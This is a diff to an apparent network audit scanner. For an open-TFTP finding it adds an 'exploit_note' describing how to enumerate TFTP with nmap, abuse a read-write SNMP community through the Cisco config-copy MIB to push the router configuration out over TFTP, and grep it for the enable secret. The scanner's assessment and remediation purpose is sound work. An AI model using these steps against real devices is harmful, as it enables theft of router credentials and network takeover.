@@ -171,7 +171,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"tftp {h.ip}   # then: get <known-name>",
                     "Restrict TFTP to the management VLAN; move to SFTP where "
                     "possible.",
-                    ["CWE-306"], kind="tftp_open"))
+                    ["CWE-306"], kind="tftp_open",
+                    exploit_note=(
+                        "nmap -sU -p69 --script tftp-enum IP ; for RW "
+                        "community: snmpset -v2c -c <RW> IP "
+                        "1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1 ... (Cisco "
+                        "config-copy MIB); then get the pushed file locally "
+                        "via tftp; grep enable-secret."),
+                    depth_tier="t1"))
     return out
 
 
